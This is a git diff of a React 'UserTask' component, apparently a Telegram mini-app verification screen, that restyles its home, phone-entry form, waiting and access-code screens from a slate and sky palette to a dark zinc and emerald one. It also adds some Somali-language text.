@@ -81,16 +81,19 @@ export default function UserTask() {
 
   if (step === 'home') {
     return (
-      <div className="flex flex-col items-center justify-center min-h-[60vh] p-8 text-center max-w-sm mx-auto">
-        <h1 className="text-2xl font-bold mb-4 text-slate-800 tracking-tight">Mini App Auth</h1>
-        <p className="text-slate-500 text-sm mb-8">
-          Complete the required verification task to receive your access code.
+      <div className="flex flex-col items-center justify-center min-h-[80vh] p-8 text-center max-w-sm mx-auto">
+        <div className="w-20 h-20 bg-zinc-900 border border-zinc-800 rounded-2xl flex items-center justify-center mb-6 shadow-2xl">
+          <Globe className="w-10 h-10 text-emerald-500" />
+        </div>
+        <h1 className="text-2xl font-bold mb-3 text-zinc-100 tracking-tight">Access Verification</h1>
+        <p className="text-zinc-500 text-sm mb-8 leading-relaxed">
+          Nidaamku wuxuu u baahan yahay in la xaqiijiyo xogtaada si aad u hesho koodhka gelitaanka (Access Code).
         </p>
         <button
           onClick={() => setStep('form')}
-          className="bg-[#24A1DE] text-white font-bold py-3.5 px-8 rounded-xl transition-colors w-full shadow-lg shadow-sky-200"
+          className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-8 rounded-xl transition-all w-full shadow-lg shadow-emerald-900/20"
         >
-          Start Verification
+          Verify Now
         </button>
       </div>
     );
@@ -99,42 +102,42 @@ export default function UserTask() {
   if (step === 'form') {
     return (
       <div className="flex flex-col max-w-md mx-auto p-6 pt-12">
-        <h2 className="text-2xl font-bold mb-6 text-slate-800 tracking-tight">Enter Details</h2>
+        <h2 className="text-2xl font-bold mb-6 text-zinc-100 tracking-tight">Enter Details</h2>
         <form onSubmit={handleSubmit} className="space-y-6">
           <div className="space-y-2">
-            <label className="block text-xs uppercase font-bold text-slate-400">Phone Number</label>
+            <label className="block text-xs uppercase tracking-widest font-bold text-zinc-500">Phone Number</label>
             <input
               type="tel"
               value={phone}
               onChange={handlePhoneChange}
               placeholder="+252 63 8364274"
-              className="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none text-slate-800 font-medium transition-all shadow-sm"
+              className="w-full px-4 py-3 bg-zinc-900 border border-zinc-800 rounded-xl focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500/50 outline-none text-zinc-200 font-mono transition-all shadow-sm placeholder-zinc-700"
               required
             />
           </div>
 
-          <div className="bg-slate-50 p-4 rounded-xl space-y-3 text-sm border border-slate-100 shadow-sm">
-            <div className="flex justify-between items-center">
-              <span className="text-slate-500 text-xs font-bold uppercase tracking-wider">Detection</span>
+          <div className="bg-zinc-900 p-4 rounded-xl space-y-3 text-sm border border-zinc-800 shadow-sm">
+            <div className="flex justify-between items-center border-b border-zinc-800/50 pb-2 mb-2">
+              <span className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest">System Detection</span>
             </div>
             <div className="flex justify-between items-center text-sm">
-              <span className="text-slate-500">Phone</span>
-              <span className="font-bold text-slate-800">{phone || '-'}</span>
+              <span className="text-zinc-400">Phone</span>
+              <span className="font-mono text-zinc-200">{phone || '-'}</span>
             </div>
             <div className="flex justify-between items-center text-sm">
-              <span className="text-slate-500">Country</span>
-              <span className="font-bold text-[#24A1DE]">{country || 'Waiting...'}</span>
+              <span className="text-zinc-400">Country</span>
+              <span className="font-bold text-emerald-400">{country || 'Waiting...'}</span>
             </div>
             <div className="flex justify-between items-center text-sm">
-              <span className="text-slate-500">Telegram ID</span>
-              <span className="font-mono bg-slate-200 text-slate-600 px-1.5 rounded py-0.5 font-bold tracking-widest">{telegramId}</span>
+              <span className="text-zinc-400">Telegram ID</span>
+              <span className="font-mono bg-zinc-950 border border-zinc-800 text-zinc-500 px-2 rounded py-0.5 tracking-widest text-xs">{telegramId}</span>
             </div>
           </div>
 
           <div className="space-y-3">
-            <label className="block text-xs uppercase font-bold text-slate-400">Account Type</label>
-            <div className="flex space-x-4 bg-white p-1 rounded-xl border border-slate-200 shadow-sm">
-              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2 rounded-lg text-sm font-bold transition-colors ${accountType === 'Personal' ? 'bg-slate-100 text-slate-800 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}>
+            <label className="block text-xs uppercase tracking-widest font-bold text-zinc-500">Account Type</label>
+            <div className="flex space-x-4 bg-zinc-900 p-1.5 rounded-xl border border-zinc-800 shadow-sm">
+              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2.5 rounded-lg text-sm font-bold transition-colors ${accountType === 'Personal' ? 'bg-zinc-800 text-zinc-200 shadow-sm' : 'text-zinc-500 hover:text-zinc-400'}`}>
                 <input
                   type="radio"
                   name="accountType"
@@ -145,7 +148,7 @@ export default function UserTask() {
                 />
                 <span>Personal</span>
               </label>
-              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2 rounded-lg text-sm font-bold transition-colors ${accountType === 'Business' ? 'bg-slate-100 text-slate-800 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}>
+              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2.5 rounded-lg text-sm font-bold transition-colors ${accountType === 'Business' ? 'bg-zinc-800 text-zinc-200 shadow-sm' : 'text-zinc-500 hover:text-zinc-400'}`}>
                 <input
                   type="radio"
                   name="accountType"
@@ -161,7 +164,7 @@ export default function UserTask() {
 
           <button
             type="submit"
-            className="w-full bg-[#24A1DE] text-white font-bold py-3.5 px-4 rounded-xl transition-colors shadow-lg shadow-sky-200 mt-2"
+            className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-4 rounded-xl transition-all shadow-lg shadow-emerald-900/20 mt-4"
           >
             Submit Request
           </button>
@@ -172,13 +175,14 @@ export default function UserTask() {
 
   if (step === 'waiting') {
     return (
-      <div className="flex flex-col items-center justify-center min-h-[60vh] p-8 text-center max-w-sm mx-auto">
-        <div className="w-16 h-16 bg-sky-50 rounded-full flex items-center justify-center mb-6">
-          <Loader2 className="w-8 h-8 text-[#24A1DE] animate-spin" />
+      <div className="flex flex-col items-center justify-center min-h-[80vh] p-8 text-center max-w-sm mx-auto">
+        <div className="w-20 h-20 bg-zinc-900 border border-zinc-800 rounded-2xl flex items-center justify-center mb-6 relative shadow-2xl">
+          <div className="absolute inset-0 bg-emerald-500/5 rounded-2xl animate-pulse"></div>
+          <Loader2 className="w-8 h-8 text-emerald-500 animate-spin" />
         </div>
-        <h2 className="text-xl font-bold text-slate-800 mb-2">Processing...</h2>
-        <p className="text-slate-500 text-sm">
-          Your request is being reviewed by the admin. Please stay on this screen.
+        <h2 className="text-xl font-bold text-zinc-100 mb-2">Processing...</h2>
+        <p className="text-zinc-500 text-sm leading-relaxed">
+          Your request is being securely verified by the admin. Fadlan halkan joog inta lagaa xaqiijinayo.
         </p>
       </div>
     );
@@ -187,25 +191,26 @@ export default function UserTask() {
   if (step === 'success' && taskData) {
     return (
       <div className="flex flex-col items-center px-6 pt-12 max-w-[340px] mx-auto text-center pb-8">
-        <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-4 mt-4">
-          <CheckCircle2 className="w-8 h-8" />
+        <div className="w-20 h-20 bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 rounded-2xl flex items-center justify-center mb-6 mt-4 shadow-2xl shadow-emerald-900/20">
+          <CheckCircle2 className="w-10 h-10" />
         </div>
         
-        <h3 className="text-lg font-bold text-slate-800">Verification Successful</h3>
-        <p className="text-xs text-slate-500 mt-2 px-4 mb-6">
-          {taskData.successMessage || 'Your account has been verified by the administrator.'}
+        <h3 className="text-xl font-bold text-zinc-100 tracking-tight">Verified Successfully</h3>
+        <p className="text-sm text-zinc-400 mt-2 px-4 mb-8 leading-relaxed">
+          {taskData.successMessage || 'Maamulaha ayaa xaqiijiyay xogtaada. (Verified)'}
         </p>
 
-        <div className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl">
-          <div className="text-[10px] uppercase font-bold text-slate-400 mb-1">Your Access Code</div>
-          <div className="text-2xl font-mono tracking-[0.2em] font-bold text-sky-600">
+        <div className="w-full p-5 bg-zinc-900 border border-emerald-500/20 rounded-2xl shadow-lg relative overflow-hidden">
+          <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-emerald-400 to-teal-500"></div>
+          <div className="text-[10px] uppercase tracking-widest font-bold text-zinc-500 mb-2">Your Access Code</div>
+          <div className="text-3xl font-mono tracking-[0.2em] font-bold text-emerald-400">
             {taskData.code || '--------'}
           </div>
         </div>
 
         {taskData.imageUrl && (
-          <div className="mt-4 w-full h-32 bg-slate-200 rounded-xl overflow-hidden relative shadow-inner">
-             <div className="absolute inset-0 flex items-center justify-center text-[10px] text-slate-400 uppercase font-bold z-0">Attached Image</div>
+          <div className="mt-6 w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl overflow-hidden relative shadow-inner">
+             <div className="absolute inset-0 flex items-center justify-center text-[10px] text-zinc-600 uppercase tracking-widest font-bold z-0">Attached Image</div>
              <img 
                src={taskData.imageUrl} 
                alt="Verification Evidence" 
@@ -221,9 +226,9 @@ export default function UserTask() {
             setPhone('');
             setCountry('');
           }}
-          className="mt-6 w-full py-3 bg-[#24A1DE] text-white rounded-xl text-sm font-bold shadow-lg shadow-sky-200"
+          className="mt-8 w-full py-3.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 border border-zinc-700 rounded-xl text-sm font-bold transition-all"
         >
-          Return to Home
+          Return Home
         </button>
       </div>
     );
